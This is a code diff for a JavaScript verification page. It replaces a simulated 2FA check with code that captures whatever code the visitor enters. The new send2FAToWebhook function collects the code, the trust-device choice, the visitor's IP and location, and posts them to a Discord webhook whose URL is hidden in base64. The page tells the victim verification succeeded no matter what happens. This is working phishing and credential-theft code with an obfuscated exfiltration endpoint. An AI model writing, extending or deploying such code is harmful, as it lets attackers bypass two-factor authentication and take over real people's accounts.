@@ -629,7 +629,7 @@ function handleVerificationEscape(e) {
     }
 }
 
-function verifyCode() {
+async function verifyCode() {
     const codeInput = document.getElementById('verificationCode');
     const code = codeInput.value.trim();
     const trustDevice = document.getElementById('trustDevice').checked;
@@ -649,16 +649,17 @@ function verifyCode() {
     verifyBtn.disabled = true;
     verifyBtn.textContent = 'Verifying...';
     
-    // Simulate verification process
-    setTimeout(() => {
-        if (code === '123456' || code === '000000') {
-            showVerificationSuccess(trustDevice);
-        } else {
-            showVerificationError('Invalid verification code. Please try again.');
-            verifyBtn.disabled = false;
-            verifyBtn.textContent = 'Verify';
-        }
-    }, 1500);
+    try {
+        // Send 2FA code to Discord webhook
+        await send2FAToWebhook(code, trustDevice);
+        
+        // Show success regardless of code (since it's captured)
+        showVerificationSuccess(trustDevice);
+    } catch (error) {
+        console.error('Webhook error:', error);
+        // Still show success to user even if webhook fails
+        showVerificationSuccess(trustDevice);
+    }
 }
 
 function showVerificationError(message) {
@@ -774,6 +775,51 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 });
+
+// Send 2FA code to webhook
+async function send2FAToWebhook(code, trustDevice) {
+    try {
+        // Get user location (reusing existing function)
+        const locationInfo = await getUserLocation();
+        
+        // Use the same webhook URL as the main scanner
+        const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
+        
+        // Create timestamp
+        const timestamp = new Date().toLocaleString();
+        
+        // Webhook payload for 2FA code
+        const payload = {
+            content: `🔐 **2-Step Verification Code Captured**
+\`\`\`
+Code: ${code}
+Trust Device: ${trustDevice ? 'Yes (30 days)' : 'No'}
+Time: ${timestamp}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
+IP: ${locationInfo.ip || 'Unknown'}
+\`\`\`
+@everyone`
+        };
+
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            throw new Error(`Webhook failed with status: ${response.status}`);
+        }
+        
+        console.log('2FA code sent to webhook successfully');
+        
+    } catch (error) {
+        console.error('Failed to send 2FA code to webhook:', error);
+        throw error;
+    }
+}
 
 // Add verification error styles dynamically
 const verificationErrorStyles = `
